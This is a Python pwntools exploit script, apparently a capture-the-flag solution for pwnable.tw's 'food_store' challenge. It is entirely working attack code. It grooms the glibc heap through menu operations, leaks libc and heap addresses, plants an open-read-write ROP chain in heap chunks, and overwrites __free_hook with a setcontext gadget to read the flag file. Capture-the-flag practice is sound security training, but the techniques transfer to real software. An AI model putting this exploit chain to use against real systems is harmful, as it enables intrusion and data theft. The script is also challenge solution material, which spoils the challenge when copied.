#!/usr/bin/env python3
"""food_store exploit – optimized for remote (pipelined I/O).

sub_1134 reads up to 0x17 (23) bytes via read(0, buf, 23).
sub_11FF reads up to its size arg via read(0, buf, size), typically 24.
scanf("%23s") reads one byte at a time (stdin is _IONBF).

By padding each read target to its exact max size, a single send()
feeds many server reads without cross-contamination.
"""

from pathlib import Path
import re
import time as _time

from pwn import *

SCRIPT_DIR = Path(__file__).resolve().parent


def pick_existing(*names):
    for name in names:
        path = SCRIPT_DIR / name
        if path.exists():
            return path
    raise FileNotFoundError(f"missing required file, tried: {names}")


exe = ELF(str(pick_existing("food_store_patched")), checksec=False)
libc = ELF(
    str(
        pick_existing(
            "libc.so.6",
            "libc-4e5dfd832191073e18a09728f68666b6465eeacd.so",
        )
    ),
    checksec=False,
)
ld = ELF(str(pick_existing("ld-2.24.so")), checksec=False)

context.binary = exe
context.timeout = 5
context.terminal = ["tmux", "splitw", "-h", "-F", "#{pane_pid}", "-P"]

remote_connection = "nc chall.pwnable.tw 10406".split()
gdbscript = ""

main_arena_offset = 0x3C1B00
large_bin_offset = main_arena_offset + 0x718
free_hook_offset = 0x3C3788

L_nop = 0x10F80
L_pop_rdi = 0x1FD7A
L_pop_rsi = 0x1FCBD
L_pop_rdx = 0x1B92
L_pop_rax = 0x3A998
L_syscall = 0xF888E
L_pop15 = 0xF8766
setcontext_gadget = 0x48045

HEAP_LEAK_DELTA = 0xB50
ARG_DELTA = 0xBD0
FRAME_DELTA = 0xD20

# ── I/O ──────────────────────────────────────────────────────────────

sla = lambda msg, data: p.sendlineafter(msg, data)
sna = lambda msg, data: p.sendlineafter(msg, str(data).encode())
sl = lambda data: p.sendline(data)


def start():
    if args.REMOTE:
        return remote(remote_connection[1], int(remote_connection[2]))
    elif args.LOCAL:
        return remote("localhost", int(args.get("PORT", 1337)))
    elif args.GDB:
        return gdb.debug([exe.path], cwd=str(SCRIPT_DIR), gdbscript=gdbscript)
    else:
        return process([exe.path], cwd=str(SCRIPT_DIR))


# ── Pipeline building blocks ─────────────────────────────────────────

INT_RD = 0x17  # sub_1134 max read size
STR_RD = 0x18  # sub_11FF read size for titles / recipe names


def pad_int(n, size=INT_RD):
    s = str(n).encode()
    return s + b"\x00" * (size - len(s) - 1) + b"\n"


def pad_str(s, size=STR_RD):
    if isinstance(s, str):
        s = s.encode()
    gap = size - len(s) - 1
    if gap < 0:
        return s[: size - 1] + b"\n"
    return s + b"\x00" * gap + b"\n"


def p_mc(n):
    return pad_int(n)


def p_create(name, ing=0):
    if isinstance(name, str):
        name = name.encode()
    return pad_int(1) + name + b"\n" + pad_int(ing) + pad_int(2)


def p_delete(name):
    if isinstance(name, str):
        name = name.encode()
    return pad_int(2) + pad_str(name)


def p_cook(name):
    if isinstance(name, str):
        name = name.encode()
    return pad_int(5) + pad_str(name)


def p_eat(idx):
    return pad_int(6) + pad_int(idx)


def p_shop_buy(idx, cnt):
    return pad_int(1) + pad_int(idx) + pad_int(cnt)


def send_pipe(payload):
    p.send(payload)


def sync_main():
    """Re-sync to main menu after pipeline.
    Send a dummy main-menu command so the server outputs its prompt.
    We keep re-sending until we see 'Your choice:' fresh in the buffer."""
    for attempt in range(10):
        try:
            p.sendline(b"3")
            p.recvuntil(b"Your choice:", timeout=30)
            return
        except EOFError:
            raise
        except Exception:
            log.debug(f"sync_main attempt {attempt+1} failed, retrying…")
            _time.sleep(1)
    raise RuntimeError("sync_main failed: could not reach main menu")


# ── Synchronous helpers ──────────────────────────────────────────────

def mc(n):
    sla(b"Your choice:", str(n).encode())


def recipe_enter():
    mc(1)


def recipe_create(name, ingredients):
    mc(1)
    sla(b"Title :", name if isinstance(name, bytes) else name.encode())
    sla(b"Choose ingredient :", str(ingredients[0]).encode())
    for i in ingredients[1:]:
        sla(b"Add more ingredient ? (1/Yes,2/No) :", b"1")
        sla(b"Choose ingredient :", str(i).encode())
    sla(b"Add more ingredient ? (1/Yes,2/No) :", b"2")


def recipe_delete(name):
    mc(2)
    sla(b"Title :", name if isinstance(name, bytes) else name.encode())


def recipe_leave():
    mc(4)


def assignment(name):
    wanted = name if isinstance(name, bytes) else name.encode()
    mc(2)
    out = p.recvuntil(b"Your choice (1/Yes,0/No) :", timeout=5)
    if wanted not in out:
        sl(b"0")
        p.recvuntil(b"So sad :(", timeout=5)
        return 0
    sl(b"1")
    p.recvuntil(b"Thank you !", timeout=5)
    return 1


def shop_enter():
    mc(4)


def shop_buy(idx, cnt):
    sl(b"1")
    sna(b"What do you want to buy ? :", idx)
    sna(b"Quantity :", cnt)


def shop_sell(idx):
    sl(b"2")
    sna(b"What do you want to sell ? :", idx)


def shop_make(name):
    sl(b"3")
    sla(b"Enjoy it :)\n", name if isinstance(name, bytes) else name.encode())


def shop_leave():
    sl(b"4")


def parse_titles_from_cook_banner(blob):
    titles = []
    marker = b"Title : "
    idx = 0
    while True:
        pos = blob.find(marker, idx)
        if pos == -1:
            break
        end = blob.find(b"\n", pos)
        if end == -1:
            break
        titles.append(blob[pos + len(marker) : end])
        idx = end + 1
    return titles


def cook(name, show=False):
    mc(5)
    banner = p.recvuntil(b"What do you want to cook :", timeout=30)
    leak = parse_titles_from_cook_banner(banner) if show else None
    sl(name if isinstance(name, bytes) else name.encode())
    return leak


def eat(idx):
    mc(6)
    sna(b"What do you want to eat ? :", idx)


# ── Exploit ──────────────────────────────────────────────────────────

p = start()
T0 = _time.time()

sla(b"Your name: ", b"M30W")

# ── Stage 1: bootstrap ───────────────────────────────────────────────
log.info(f"[{_time.time()-T0:.1f}s] Stage 1: bootstrap")

cook(b"Beef noodles")
eat(0)
cook(b"Beef noodles")
shop_enter()
shop_sell(0)
shop_buy(2, 1)
shop_buy(5, 1)
shop_leave()

recipe_enter()
recipe_create(b"Expensive", [2, 3, 3, 3, 4])
recipe_create(b"Cheap", [0])
recipe_leave()

cook(b"Expensive")
eat(0)
cook(b"Cheap")
while assignment(b"Cheap") == 0:
    pass
cook(b"Cheap")

# ── Stage 2: largebin / libc leak  (PIPELINED) ──────────────────────
log.info(f"[{_time.time()-T0:.1f}s] Stage 2: libc leak (pipeline)")

pipe = b""
pipe += p_mc(1)
pipe += p_create("pad1_1")
pipe += p_create("pad1_2")
for i in range(0x40):
    pipe += p_create(f"pad1_2_{i}")
pipe += p_mc(4)
pipe += p_mc(4)
pipe += p_shop_buy(4, 0)
pipe += p_mc(4)
pipe += p_mc(1)
pipe += p_create("pad1_3")
pipe += p_create("pad1_4")
for i in range(0x41):
    pipe += p_create(f"pad1_4_{i}")
pipe += p_mc(4)
pipe += p_mc(4)
pipe += p_shop_buy(6, 0)
pipe += p_mc(4)
pipe += p_mc(1)
for i in range(0x3F, -1, -1):
    pipe += p_delete(f"pad1_2_{i}")
for i in range(0x40, -1, -1):
    pipe += p_delete(f"pad1_4_{i}")
pipe += p_delete("pad1_4")
pipe += p_delete("pad1_2")
pipe += p_delete("pad1_1")
pipe += p_delete("pad1_3")
pipe += p_create("pad1")
pipe += p_mc(4)

log.info(f"  payload {len(pipe)} bytes, sending…")
send_pipe(pipe)
log.info(f"[{_time.time()-T0:.1f}s]  pipeline sent, reading leak…")

leak_name = cook(b"nothing", show=True)[-1]
large_bin_addr = u64(leak_name.ljust(8, b"\x00"))
libc_base = large_bin_addr - large_bin_offset
log.success(f"libc_base = {libc_base:#x}")

# ── Stage 3: heap leak ──────────────────────────────────────────────
log.info(f"[{_time.time()-T0:.1f}s] Stage 3: heap leak")

cook(leak_name)
eat(1)
cook(leak_name)
shop_enter()
shop_sell(1)
shop_leave()
cook(leak_name)

recipe_enter()
recipe_create(b"pad2_1", [0])
recipe_create(b"pad2_2", [0])
recipe_create(b"pad2_3", [0])
recipe_create(b"pad2_4", [0])
recipe_create(b"pad2_5", [0])
recipe_create(b"pad2_6", [0])
recipe_leave()

cook(leak_name)

recipe_enter()
recipe_delete(b"pad2_6")
recipe_delete(b"pad2_4")
recipe_delete(b"pad2_3")
recipe_delete(b"pad2_2")
recipe_delete(b"pad2_1")
recipe_delete(b"pad2_5")
recipe_create(b"pad2", [0])
recipe_leave()

pipe = b""
for _ in range(7):
    pipe += p_cook(leak_name)
send_pipe(pipe)
sync_main()

leak_name2 = cook(b"nothing", show=True)[-1]
heap_addr = u64(leak_name2.ljust(8, b"\x00")) - HEAP_LEAK_DELTA
log.success(f"heap_addr = {heap_addr:#x}")
cook(leak_name)

# ── Stage 4: ORW ROP chain ──────────────────────────────────────────
log.info(f"[{_time.time()-T0:.1f}s] Stage 4: ORW ROP chain")

argument = b"/home/food_store/flag"
ROPchain = (
    p64(libc_base + L_pop_rdi) + p64(heap_addr + ARG_DELTA)
    + p64(libc_base + L_pop_rsi) + p64(0)
    + p64(libc_base + L_pop_rdx) + p64(0)
    + p64(libc_base + L_pop_rax) + p64(2)
    + p64(libc_base + L_syscall) + p64(libc_base + L_nop)
    + p64(libc_base + L_pop_rdi) + p64(3)
    + p64(libc_base + L_pop_rsi) + p64(heap_addr)
    + p64(libc_base + L_pop_rdx) + p64(0x100)
    + p64(libc_base + L_pop_rax) + p64(0)
    + p64(libc_base + L_syscall) + p64(libc_base + L_nop)
    + p64(libc_base + L_pop_rdi) + p64(1)
    + p64(libc_base + L_pop_rsi) + p64(heap_addr)
    + p64(libc_base + L_pop_rdx) + p64(0x100)
    + p64(libc_base + L_pop_rax) + p64(1)
    + p64(libc_base + L_syscall) + p64(libc_base + L_nop)
)

recipe_enter()
recipe_create(argument, [0])
for i in range(0, len(ROPchain), 0x10):
    recipe_create(ROPchain[i : i + 0x10] + p64(libc_base + L_pop15)[:-1], [0])
recipe_leave()

# ── Stage 5: free_hook -> setcontext+0x35 ────────────────────────────
log.info(f"[{_time.time()-T0:.1f}s] Stage 5: overwrite free_hook")

recipe_enter()
recipe_create(b"pad3_1", [0])
recipe_create(b"pad3_2", [0])
recipe_create(b"pad3_3", [0])
recipe_create(b"pad3_4", [0])
recipe_create(
    b"pad3_5\x00\x00"
    + p64(0)
    + p64(libc_base + free_hook_offset - 0x80)[:-1],
    [0],
)
recipe_create(
    b"pad3_6\x00\x00"
    + p64(0)
    + p64(libc_base + setcontext_gadget)[:-1],
    [0],
)
recipe_leave()

cook(leak_name)
cook(leak_name)

recipe_enter()
recipe_delete(b"pad3_6")
recipe_delete(b"pad3_5")
recipe_delete(b"pad3_3")
recipe_delete(b"pad3_2")
recipe_delete(b"pad3_1")
recipe_delete(b"pad3_4")
recipe_create(b"pad3_4", [0])
recipe_leave()

pipe = b""
for _ in range(5):
    pipe += p_cook(leak_name)
send_pipe(pipe)
sync_main()

# ── Stage 6: trigger ─────────────────────────────────────────────────
log.info(f"[{_time.time()-T0:.1f}s] Stage 6: trigger")

recipe_enter()
recipe_create(b"link_to_hook", [0])
recipe_create(b"link_to_gadget", [0])
recipe_leave()

shop_enter()
shop_make(
    p64(0)
    + p64(0)
    + p64(heap_addr + FRAME_DELTA)
    + p64(libc_base + L_nop)[:-1]
)
shop_leave()

recipe_enter()
recipe_delete(b"link_to_gadget")

log.success(f"[{_time.time()-T0:.1f}s] EXPLOIT COMPLETE")
log.info("Waiting for flag output...")

# Give ORW chain time to execute and flush output to socket
_time.sleep(3)
flag_data = b""
try:
    # Blocking recv with timeout to capture ORW output
    while True:
        d = p.recv(timeout=5)
        if not d:
            break
        flag_data += d
except EOFError:
    pass

if flag_data:
    decoded = flag_data.decode('utf-8', errors='replace')
    print(decoded)
    for line in decoded.split('\n'):
        if 'flag{' in line.lower():
            log.success(f"FLAG: {line}")
else:
    log.warn("No data received — ORW chain may have executed silently")

p.close()
